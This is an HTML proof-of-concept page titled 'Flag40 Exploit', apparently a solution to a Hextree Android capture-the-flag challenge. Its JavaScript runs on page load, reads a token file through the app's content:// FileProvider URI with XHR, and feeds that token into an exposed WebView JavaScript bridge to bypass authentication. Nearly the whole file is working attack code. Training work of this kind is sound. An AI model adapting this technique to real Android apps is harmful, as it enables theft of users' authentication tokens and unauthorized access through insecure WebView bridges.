<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Flag40 Exploit</title>
    <style>
        body { font-family: sans-serif; padding: 20px; background: #f9f9f9; }
        h1 { color: #333; }
        #status { margin-top: 10px; font-weight: bold; color: #007700; }
    </style>
</head>
<body>
    <h1>Flag40 Exploit</h1>
    <div id="status">Loading...</div>

    <script>
        const status = document.getElementById('status');

        // The content:// URI of the token file exposed by the app's FileProvider
        const tokenUri = 'content://io.hextree.root/files/token.txt';

        function debug(msg) {
            console.log(msg);
            status.innerText = msg;
        }

        function readTokenAndAuth(uri) {
            if (!window.hextree || !window.hextree.authCallback) {
                debug('hextree interface not available.');
                return;
            }

            debug('Attempting to fetch token via content:// URI...');

            // Try XHR to read the content:// URI
            const xhr = new XMLHttpRequest();
            xhr.open('GET', uri, true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200 && xhr.responseText) {
                        const token = xhr.responseText.trim();
                        debug('Token fetched: ' + token.substring(0, 10) + '...');
                        try {
                            window.hextree.authCallback(token);
                            debug('authCallback executed successfully!');
                        } catch (e) {
                            debug('Error calling authCallback: ' + e);
                        }
                    } else {
                        debug('Failed to read token. Status: ' + xhr.status);
                    }
                }
            };
            xhr.onerror = function(e) {
                debug('XHR error: ' + e);
            };
            xhr.send();
        }

        // Run after the page loads
        window.onload = function() {
            debug('Page loaded, starting exploit...');
            setTimeout(() => readTokenAndAuth(tokenUri), 200);
        };
    </script>
</body>
</html>
